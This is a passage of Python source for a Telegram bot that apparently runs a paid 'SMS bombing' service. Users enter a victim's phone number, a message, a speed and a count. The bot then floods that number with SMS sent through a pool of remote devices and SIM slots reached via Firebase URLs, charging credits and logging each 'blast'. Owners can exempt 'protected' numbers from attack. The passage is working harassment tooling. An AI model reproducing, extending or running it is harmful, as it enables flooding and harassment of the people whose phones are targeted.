@R.callback_query(F.data == "user:send")
async def user_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("⛔ Force Join compulsory hai!", show_alert=True)
        await cq.message.edit_text(
            force_join_text(missing),
            reply_markup=force_join_kb(missing),
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
        return
    if not can_use(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True)
        return
    await state.set_state(S.send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML",
    )


@R.message(S.send_number)
async def user_got_number(msg: Message, state: FSMContext):
    number = (msg.text or "").strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return
    d = load()
    sync_runtime_state(d)
    if number in PROTECTED_NUMBERS:
        await msg.answer(
            f"{em(EMOJI_LOCK, '🔒')} <b>Ye number protected hai!</b>\n\n"
            f"Sirf Owner/Super Admin is number pe SMS bhej sakte hain.",
            parse_mode="HTML",
        )
        return
    await state.update_data(number=number)
    await state.set_state(S.send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{esc(mask_number(number))}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
        f"Jo message bhejna hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", "user:cancel")]),
        parse_mode="HTML",
    )


@R.message(S.send_message)
async def user_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=(msg.text or "").strip())
    await state.set_state(S.send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>\n\n"
        f"Sending speed select karein:",
        reply_markup=speed_kb("user"),
        parse_mode="HTML",
    )


@R.callback_query(F.data.regexp(r"^(user|owner|admin):speed:(fast|medium|slow)$"))
async def speed_selected_handler(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    prefix, _, mode = cq.data.split(":")

    if prefix == "owner" and not is_owner(uid, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    if prefix == "admin" and not is_admin(uid, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    if prefix == "user" and not can_use(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True)
        return

    speed_map = {"fast": SPEED_FAST, "medium": SPEED_MEDIUM, "slow": SPEED_SLOW}
    label_map = {"fast": "🚀 FAST", "medium": "⚡ MEDIUM", "slow": "🐢 SLOW"}
    selected_speed = speed_map[mode]
    speed_label = label_map[mode]

    next_state_map = {"user": S.send_count, "owner": S.owner_send_count, "admin": S.admin_send_count}
    cancel_cb_map = {"user": "user:cancel", "owner": "owner:home", "admin": "admin:home"}

    await state.update_data(send_speed=selected_speed)
    await state.set_state(next_state_map[prefix])

    devices = await get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)
    count = len(devices)

    credit_info = ""
    if prefix == "user" and not is_admin(uid, d) and not is_owner(uid, d):
        user_credits = get_user_credits(uid, d)
        credit_info = f"\n{em(EMOJI_MONEY, '💰')} Your Credits: <b>{user_credits}</b> (max {user_credits} bhej sakte hain)\n"

    await cq.answer(f"{speed_label} selected!")
    await cq.message.edit_text(
        f"{speed_label} <b>selected!</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online APIs : <b>{count}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} Device Capacity: <b>{count * 3}</b> SMS{credit_info}\n\n"
        f"Kitne SMS bhejna hai?",
        reply_markup=kb([(f"{sc('cancel')}", cancel_cb_map[prefix])]),
        parse_mode="HTML",
    )


@R.message(S.send_count)
async def user_got_count(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    fsmd = await state.get_data()
    try:
        count = int((msg.text or "").strip())
        if count < 1:
            raise ValueError
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo (e.g. 5):", parse_mode="HTML")
        return
    await state.clear()

    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)

    if not is_admin(uid, d) and not is_owner(uid, d):
        current_credits = get_user_credits(uid, d)
        if current_credits <= 0:
            await msg.answer(
                f"{em(EMOJI_CROSS, '❌')} <b>Aapke paas credits nahi hain!</b>\n\n"
                f"{em(EMOJI_MONEY, '💰')} Credits kharidne ke liye Admin se contact karein.",
                reply_markup=kb([(f"{sc('home')}", "user:home")]),
                parse_mode="HTML",
                disable_web_page_preview=True,
            )
            return
        if count > current_credits:
            await msg.answer(
                f"{em(EMOJI_WARNING, '⚠️')} Aapke paas sirf {current_credits} credits hain! Ab {current_credits} bhej raha hoon...",
                parse_mode="HTML",
            )
            count = current_credits

    devices = await get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)
    if not devices:
        await msg.answer(
            f"{em(EMOJI_WARNING, '😴')} Koi API online nahi! Try later.",
            reply_markup=kb([(f"{sc('home')}", "user:home")]),
            parse_mode="HTML",
        )
        return

    await run_sms_blast_with_progress(msg.bot, msg, uid, number, message_text, count, devices, send_speed)


@R.callback_query(F.data == "owner:send")
async def owner_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.owner_send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Super Admin SMS Send</b>\n\n"
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML",
    )


@R.message(S.owner_send_number)
async def owner_got_number(msg: Message, state: FSMContext):
    number = (msg.text or "").strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return
    await state.update_data(number=number)
    await state.set_state(S.owner_send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{esc(number)}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
        f"Jo message bhejna hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML",
    )


@R.message(S.owner_send_message)
async def owner_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=(msg.text or "").strip())
    await state.set_state(S.owner_send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>\n\n"
        f"Sending speed select karein:",
        reply_markup=speed_kb("owner"),
        parse_mode="HTML",
    )


@R.message(S.owner_send_count)
async def owner_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int((msg.text or "").strip())
        if count < 1:
            raise ValueError
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo (e.g. 5):", parse_mode="HTML")
        return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    d = load()
    devices = await get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)
    if not devices:
        await msg.answer(
            f"{em(EMOJI_WARNING, '😴')} Koi API online nahi! Try later.",
            reply_markup=kb([(f"{sc('owner panel')}", "owner:home")]),
            parse_mode="HTML",
        )
        return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message_text, count, devices, send_speed)


@R.callback_query(F.data == "admin:send")
async def admin_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    await state.set_state(S.admin_send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admin SMS Send</b>\n\n"
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]),
        parse_mode="HTML",
    )


@R.message(S.admin_send_number)
async def admin_got_number(msg: Message, state: FSMContext):
    number = (msg.text or "").strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return
    d = load()
    sync_runtime_state(d)
    if number in PROTECTED_NUMBERS:
        protector_uid = PROTECTED_NUMBERS[number]
        if not is_owner(msg.from_user.id, d) and msg.from_user.id != protector_uid:
            await msg.answer(
                f"{em(EMOJI_LOCK, '🔒')} <b>Ye number protected hai!</b>\n\n"
                f"Sirf Owner/Super Admin is number pe SMS bhej sakte hain.",
                parse_mode="HTML",
            )
            return
    await state.update_data(number=number)
    await state.set_state(S.admin_send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{esc(mask_number(number))}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
        f"Jo message bhejna hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]),
        parse_mode="HTML",
    )


@R.message(S.admin_send_message)
async def admin_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=(msg.text or "").strip())
    await state.set_state(S.admin_send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>\n\n"
        f"Sending speed select karein:",
        reply_markup=speed_kb("admin"),
        parse_mode="HTML",
    )


@R.message(S.admin_send_count)
async def admin_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int((msg.text or "").strip())
        if count < 1:
            raise ValueError
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo (e.g. 5):", parse_mode="HTML")
        return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    d = load()
    devices = await get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)
    if not devices:
        await msg.answer(
            f"{em(EMOJI_WARNING, '😴')} Koi API online nahi! Try later.",
            reply_markup=kb([(f"{sc('admin panel')}", "admin:home")]),
            parse_mode="HTML",
        )
        return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message_text, count, devices, send_speed)


async def run_sms_blast_with_progress(
    bot: Bot,
    msg: Message,
    uid: int,
    number: str,
    message: str,
    count: int,
    devices: list,
    speed: float = SPEED_DEFAULT,
):
    await send_random_video(bot, msg.chat.id, caption=f"💣 <b>SMS Bombing Started on {esc(mask_number(number))}!</b>")

    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            old_session = USER_SESSIONS[uid]
            if old_session.task and not old_session.task.done():
                await msg.answer(
                    f"{em(EMOJI_WARNING, '⚠️')} <b>Ek sending already chal rahi hai!</b>\n"
                    f"Pehle woh khatam hone do ya stop karein.",
                    parse_mode="HTML",
                )
                return
            del USER_SESSIONS[uid]

        session = UserSession(uid)
        session.number = number
        USER_SESSIONS[uid] = session

    d_init = load()
    is_regular_user = not is_admin(uid, d_init) and not is_owner(uid, d_init)
    current_credits = get_user_credits(uid, d_init) if is_regular_user else None
    speed_label_display = "🚀 FAST" if speed == SPEED_FAST else "⚡ MEDIUM" if speed == SPEED_MEDIUM else "🐢 SLOW"

    try:
        progress_msg = await msg.answer(
            progress_text(0, 0, count, current_credits, speed_label_display),
            reply_markup=stop_send_kb(),
            parse_mode="HTML",
        )
    except Exception as e:
        log.error(f"Failed to send progress message: {e}")
        async with SESSIONS_LOCK:
            USER_SESSIONS.pop(uid, None)
        return

    sent_ok = 0
    sent_fail = 0
    api_usage_delta = {}
    last_update_time = time.time()
    start_time = time.time()

    async def do_send():
        nonlocal sent_ok, sent_fail, last_update_time
        try:
            remaining_target = count
            for device in devices:
                if remaining_target <= 0:
                    break

                async with session.lock:
                    if session.cancelled:
                        break

                fb_id = device["fb_id"]
                fb_url = device["fb_url"]
                dev_id = device["dev_id"]
                sims = device["sims"]
                sim_slots = [s.get("simSlotIndex", 0) for s in sims if isinstance(s, dict)] if sims else [0]
                if not sim_slots:
                    sim_slots = [0]

                device_quota = min(3, remaining_target)
                device_attempts = 0

                for sim in sim_slots:
                    async with session.lock:
                        if device_attempts >= device_quota or remaining_target <= 0 or session.cancelled:
                            break
                        device_attempts += 1

                    ok = await send_sms_via_device(fb_url, dev_id, sim, number, message)

                    async with session.lock:
                        if fb_id not in api_usage_delta:
                            api_usage_delta[fb_id] = {"sent": 0, "failed": 0}

                        if ok:
                            sent_ok += 1
                            remaining_target -= 1
                            api_usage_delta[fb_id]["sent"] += 1
                            if is_regular_user:
                                d_temp = load()
                                deduct_credits(uid, 1, d_temp)
                                d_temp["stats"]["total_sent"] = d_temp["stats"].get("total_sent", 0) + 1
                                k = str(uid)
                                if k in d_temp["users"]:
                                    d_temp["users"][k]["uses"] = d_temp["users"][k].get("uses", 0) + 1
                                d_temp.setdefault("sms_history", {}).setdefault(str(uid), []).append(
                                    {
                                        "number": number,
                                        "message": message[:100],
                                        "timestamp": int(time.time()),
                                        "status": "sent",
                                    }
                                )
                                save(d_temp)
                        else:
                            sent_fail += 1
                            api_usage_delta[fb_id]["failed"] += 1

                        now = time.time()
                        done_count = sent_ok + sent_fail
                        if (now - last_update_time >= _PROGRESS_UPDATE_INTERVAL) or (remaining_target <= 0) or session.cancelled:
                            current_credits_live = get_user_credits(uid, load()) if is_regular_user else None
                            try:
                                await progress_msg.edit_text(
                                    progress_text(sent_ok, sent_fail, count, current_credits_live, speed_label_display),
                                    reply_markup=stop_send_kb() if not session.cancelled else None,
                                    parse_mode="HTML",
                                )
                            except TelegramBadRequest:
                                pass
                            last_update_time = now

                    if speed > 0:
                        await asyncio.sleep(speed)

        except Exception as e:
            log.error(f"Error in send loop for user {uid}: {e}")
        finally:
            async with session.lock:
                session.sent = sent_ok
                session.failed = sent_fail

    task = asyncio.create_task(do_send())
    session.task = task
    await task
    was_cancelled = session.cancelled

    async with SESSIONS_LOCK:
        USER_SESSIONS.pop(uid, None)

    d_final = load()
    if not is_regular_user:
        d_final["stats"]["total_sent"] = d_final["stats"].get("total_sent", 0) + sent_ok
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
        for fb_id, delta in api_usage_delta.items():
            d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
            d_final["stats"]["api_usage"][fb_id]["sent"] += delta["sent"]
            d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]
        k = str(uid)
        if k in d_final["users"]:
            d_final["users"][k]["uses"] = d_final["users"][k].get("uses", 0) + sent_ok
        d_final.setdefault("sms_history", {}).setdefault(str(uid), []).append(
            {
                "number": number,
                "message": message[:100],
                "timestamp": int(time.time()),
                "status": "completed" if not was_cancelled else "stopped",
            }
        )
    else:
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
        for fb_id, delta in api_usage_delta.items():
            d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
            d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]

    duration = int(time.time() - start_time)
    log_activity(
        d_final,
        "sms_blast",
        uid,
        f"Sent: {sent_ok}, Failed: {sent_fail}, Total: {count}, Duration: {fmt_duration(duration)}, Stopped: {was_cancelled}",
    )
    save(d_final)

    try:
        user_chat_info = await bot.get_chat(uid)
        u_name = user_chat_info.full_name or "Unknown"
        u_uname = f"@{user_chat_info.username}" if user_chat_info.username else "No Username"
    except Exception:
        u_name = d_final.get("users", {}).get(str(uid), {}).get("name", "Unknown")
        u_uname = "No Username"

    chan_log = (
        f"🚀 <b>SMS BLAST ACTIVITY LOG</b>\n\n"
        f"👤 <b>User:</b> {esc(u_name)}\n"
        f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
        f"🌐 <b>Username:</b> {esc(u_uname)}\n"
        f"📞 <b>Target Number:</b> <code>{esc(number)}</code>\n"
        f"💬 <b>Message:</b> <code>{esc(message)}</code>\n"
        f"✅ <b>Sent:</b> <b>{sent_ok}</b>\n"
        f"❌ <b>Failed:</b> <b>{sent_fail}</b>\n"
        f"📊 <b>Requested Count:</b> <b>{count}</b>\n"
        f"⏱ <b>Duration:</b> <b>{fmt_duration(duration)}</b>\n"
        f"🛑 <b>Status:</b> {'STOPPED BY USER' if was_cancelled else 'COMPLETED'}"
    )
    asyncio.create_task(send_channel_log(bot, chan_log))

    if sent_fail == 0 and sent_ok > 0:
        icon = em(EMOJI_CHECK, "✅")
    elif sent_ok > 0:
        icon = em(EMOJI_WARNING, "⚠️")
    else:
        icon = em(EMOJI_CROSS, "❌")

    credit_text = ""
    if is_regular_user:
        remaining = get_user_credits(uid, load())
        credit_text = f"\n{em(EMOJI_MONEY, '💰')} Credits Used: <b>{sent_ok}</b>\n{em(EMOJI_MONEY, '💳')} Remaining: <b>{remaining}</b>"

    stopped_text = f"\n{em(EMOJI_CROSS, '🛑')} <b>User ne beech mein stop kiya!</b>" if was_cancelled else ""
    duration_text = f"\n{em(EMOJI_GEAR, '⏱')} Duration: <b>{fmt_duration(duration)}</b>"

    d_after = load()
    if is_owner(uid, d_after):
        back_btn = [btn("ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]
    elif is_admin(uid, d_after):
        back_btn = [btn("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", "admin:home", EMOJI_GEAR, "🔙", style="primary")]
    else:
        back_btn = [
            btn("sᴇɴᴅ ᴀɴᴏᴛʜᴇʀ", "user:send", EMOJI_ROCKET, "📤", style="success"),
            btn("ʜᴏᴍᴇ", "user:home", EMOJI_STAR, "🏠", style="primary"),
        ]

    try:
        await progress_msg.edit_text(
            f"{icon} <b>SMS Blast Result</b>{stopped_text}\n\n"
            f"{em(EMOJI_PHONE, '📞')} To: <code>{esc(mask_number(number))}</code>\n"
            f"{em(EMOJI_STAR, '💬')} Message: <code>{esc(message[:50])}{'...' if len(message) > 50 else ''}</code>\n"
            f"{em(EMOJI_CHECK, '✅')} Sent: <b>{sent_ok}</b>\n"
            f"{em(EMOJI_CROSS, '❌')} Failed: <b>{sent_fail}</b>\n"
            f"{em(EMOJI_FIRE, '🔥')} APIs used: <b>{len(api_usage_delta)}</b>"
            f"{duration_text}{credit_text}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[back_btn]),
            parse_mode="HTML",
        )
    except Exception as e:
        log.error(f"Failed to edit final progress message: {e}")


@R.callback_query(F.data == "user:stop_send")
async def user_stop_send(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    async with SESSIONS_LOCK:
        session = USER_SESSIONS.get(uid)
        if not session or (session.task and session.task.done()):
            await cq.answer("✅ Sending already complete ya koi active sending nahi!", show_alert=True)
            return
        session.cancelled = True

    await cq.answer("🛑 Stop signal bhej diya! Thodi der mein sending ruk jayegi...", show_alert=True)
    try:
        async with session.lock:
            current_sent = session.sent
            current_failed = session.failed
        await cq.message.edit_text(
            f"{em(EMOJI_CROSS, '🛑')} <b>Stopping...</b>\n\n"
            f"{em(EMOJI_CHECK, '✅')} Sent: <b>{current_sent}</b>\n"
            f"{em(EMOJI_CROSS, '❌')} Failed: <b>{current_failed}</b>\n\n"
            f"<i>Current sending complete hone ke baad ruk jayega...</i>",
            parse_mode="HTML",
        )
    except Exception:
        pass


# ========== AUTO 1-MIN MESSAGE (WITH PREVIOUS MSG AUTO-DELETE) ==========
@R.callback_query(F.data == "owner:automsg:menu")
async def owner_automsg_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.clear()
    auto_cfg = d.get("auto_msg", {})
    status = f"{em(EMOJI_CHECK, '🟢')} ACTIVE (Every 1 Min)" if auto_cfg.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} OFF"
    msg_preview = esc(auto_cfg.get("text") or "Not set")
    text = (
        f"{em(EMOJI_BELL, '🔔')} <b>Auto 1-Minute User Message</b>\n\n"
        f"Status      : <b>{status}</b>\n"
        f"Interval    : <b>Every 60 Seconds</b>\n"
        f"Auto Delete : <b>Previous msg auto-deleted every 1 min</b>\n"
        f"Message     : <code>{msg_preview[:180]}</code>"
    )
    await cq.message.edit_text(text, reply_markup=auto_msg_kb(d), parse_mode="HTML")


@R.callback_query(F.data == "owner:automsg:set")
async def owner_automsg_set_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.auto_msg_text)
    await cq.message.edit_text(
        f"{em(EMOJI_BELL, '🔔')} <b>Set Auto 1-Min Message</b>\n\n"
        f"Jo message har 1 minute mein har user ko bhejna hai woh likhein:\n"
        f"<i>(Har 1 minute naya msg aayega aur purana msg automatically delete ho jayega.)</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:automsg:menu")]),
        parse_mode="HTML",
    )


@R.message(S.auto_msg_text)
async def owner_automsg_set_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    txt = (msg.text or "").strip()
    if not txt:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Khali message nahi ho sakta.", parse_mode="HTML")
        return
    d.setdefault("auto_msg", {})
    d["auto_msg"]["text"] = txt
    d["auto_msg"]["enabled"] = True
    d["auto_msg"]["updated_at"] = int(time.time())
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Auto 1-Min Message Set & Activated!</b>\n\n"
        f"<code>{esc(txt[:200])}</code>",
        reply_markup=auto_msg_kb(d),
        parse_mode="HTML",
    )


@R.callback_query(F.data == "owner:automsg:toggle")
async def owner_automsg_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    auto_cfg = d.setdefault("auto_msg", {})
    if not auto_cfg.get("enabled") and not str(auto_cfg.get("text", "")).strip():
        await cq.answer("⚠️ Pehle message set karein!", show_alert=True)
        return
    auto_cfg["enabled"] = not bool(auto_cfg.get("enabled"))
    save(d)
    await cq.answer("🟢 Auto 1-Min ON!" if auto_cfg["enabled"] else "🔴 Auto 1-Min OFF!", show_alert=True)
    await owner_automsg_menu(cq, state)


@R.callback_query(F.data == "owner:automsg:now")
async def owner_automsg_now(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    auto_cfg = d.get("auto_msg", {})
    if not str(auto_cfg.get("text", "")).strip():
        await cq.answer("⚠️ Pehle message set karein!", show_alert=True)
        return
    auto_cfg["enabled"] = True
    save(d)
    await cq.answer("⚡ Cycle triggered! Har 1 min mein auto-refresh hoga.", show_alert=True)
    await owner_automsg_menu(cq, state)


# ========== CLEAN INVALID / EXPIRED FIREBASES IN BULK ==========
@R.callback_query(F.data == "owner:fb:clean_bad")
async def owner_fb_clean_bad(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    fbs = d.get("firebases", [])
    if not fbs:
        await cq.answer("❌ Koi Firebase configured nahi hai!", show_alert=True)
        return

    await cq.answer("🧹 Checking all Firebase URLs...", show_alert=False)
    healthy, removed = await cleanup_bad_firebases(d)

    if not removed:
        await cq.answer("✅ Sabhi Firebase URLs valid/active hain!", show_alert=True)
        return

    removed_ids = {item["id"] for item, _ in removed}
    d["firebases"] = healthy
    log_activity(d, "clean_bad_firebase", cq.from_user.id, f"Removed {len(removed)} invalid/expired Firebase URLs")
    save(d)

    async with CACHE_LOCK:
        global CACHED_DEVICES
        CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") not in removed_ids]
    for rid in removed_ids:
        FB_DEVICE_COUNTS.pop(rid, None)

    sample_lines = []
    for item, reason in removed[:12]:
        sample_lines.append(f"• <code>{esc(item.get('url', ''))}</code> — <i>{esc(reason)}</i>")
    more_txt = f"\n<i>...and {len(removed) - 12} more</i>" if len(removed) > 12 else ""

    await cq.message.edit_text(
        f"{em(EMOJI_CHECK, '🧹')} <b>Faltu / Expired Firebase Cleaned!</b>\n\n"
        f"{em(EMOJI_CROSS, '🗑')} Removed : <b>{len(removed)}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')} Active  : <b>{len(healthy)}</b>\n\n"
        + "\n".join(sample_lines)
        + more_txt,
        reply_markup=fb_menu_kb(d, 0),
        parse_mode="HTML",
    )


# ========== VIDEOS, PROTECT, TRACK, CREDITS, USERS, STATS, SETTINGS ==========
@R.callback_query(F.data == "owner:videos:menu")
async def owner_videos_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    videos = d.get("videos", [])
    await cq.message.edit_text(
        f"{em(EMOJI_VIDEO, '📹')} <b>Video Manager</b>\n\nTotal Videos Saved: <b>{len(videos)}</b>",
        reply_markup=videos_menu_kb(d),
        parse_mode="HTML",
    )


@R.callback_query(F.data == "owner:videos:add")
async def owner_videos_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.add_video)
    await cq.message.edit_text(
        f"{em(EMOJI_VIDEO, '📹')} <b>Add Video</b>\n\nTelegram par video bhejiyega ya URL/File ID send karein:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:videos:menu")]),
        parse_mode="HTML",
    )


@R.message(S.add_video)
async def owner_videos_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return
    video_file_id = None
    if msg.video:
        video_file_id = msg.video.file_id
    elif msg.document and msg.document.mime_type and msg.document.mime_type.startswith("video"):
        video_file_id = msg.document.file_id
    elif msg.text:
        video_file_id = msg.text.strip()
    if not video_file_id:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid Video send karein.", parse_mode="HTML")
        return
    d.setdefault("videos", []).append(video_file_id)
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Video Saved Successfully!</b>",
        reply_markup=videos_menu_kb(load()),
        parse_mode="HTML",
    )


@R.callback_query(F.data.startswith("owner:videos:del:"))
async def owner_videos_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    idx = int(cq.data.split("owner:videos:del:", 1)[1])
    videos = d.get("videos", [])
    if 0 <= idx < len(videos):
        videos.pop(idx)
        d["videos"] = videos
        save(d)
        await cq.answer("🗑 Video Removed!")
    await owner_videos_menu(cq, state)


@R.callback_query(F.data == "owner:videos:bulk_del")
async def owner_videos_bulk_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    d["videos"] = []
    save(d)
    await cq.answer("🗑 All Videos Deleted Bulk Mode!", show_alert=True)
    await owner_videos_menu(cq, state)


@R.callback_query(F.data == "user:random_video")
async def user_trigger_video(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not d.get("videos"):
        await cq.answer("❌ Abhi koi video available nahi hai!", show_alert=True)
        return
    await cq.answer("📹 Sending video...")
    await send_random_video(cq.bot, cq.message.chat.id, caption=f"{em(EMOJI_VIDEO, '📹')} Enjoy your video!")


@R.callback_query(F.data == "owner:protect")
async def owner_protect_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.protect_number)
    await cq.message.edit_text(
        f"{em(EMOJI_LOCK, '🔒')} <b>Protect Number</b>\n\n"
        f"Jis number ko protect karna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML",
    )


@R.message(S.protect_number)
async def owner_protect_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    number = (msg.text or "").strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return
